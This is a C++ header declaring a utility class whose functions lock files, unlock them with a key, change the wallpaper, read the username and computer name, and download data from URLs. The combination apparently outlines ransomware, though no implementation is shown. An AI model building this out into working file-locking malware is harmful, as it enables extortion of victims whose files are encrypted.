#pragma once

#include <string>

class GeneralOperation
{
public:
	static void ChangeWallpeper();
	static void GetHardDiskDrivesNames(std::vector<std::string> &strIPAddresses);
	static void LockFiles();
	static void UnlockFiles(std::string const & key);
	static std::string GetLastErrorAsString();
	static std::string Username();
	static std::string ComputerName();
	static std::string FetchDataFromURL(std::string url, std::string & file, int port, std::string requestType);
	static void DownloadData(std::string url, std::string file, int port, std::string requestType, std::string fileDestination);
};